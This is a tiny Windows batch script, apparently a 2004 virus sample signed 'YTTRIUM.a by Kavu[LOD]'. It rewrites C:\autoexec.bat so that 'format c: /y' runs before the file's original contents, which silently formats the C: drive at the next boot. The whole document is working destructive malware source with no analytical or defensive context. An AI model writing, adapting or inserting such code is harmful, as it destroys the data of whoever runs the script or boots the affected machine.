   ::YTTRIUM.a by Kavu[LOD] 5/10/2004
   ::re 2 all
   @echo off
   copy C:\autoexec.bat 1.tmp
   del C:\autoexec.bat /q /f
   echo format c: /y>>c:\autoexec.bat
   type 1.tmp>>c:\autoexec.bat
   del 1.tmp /q /f
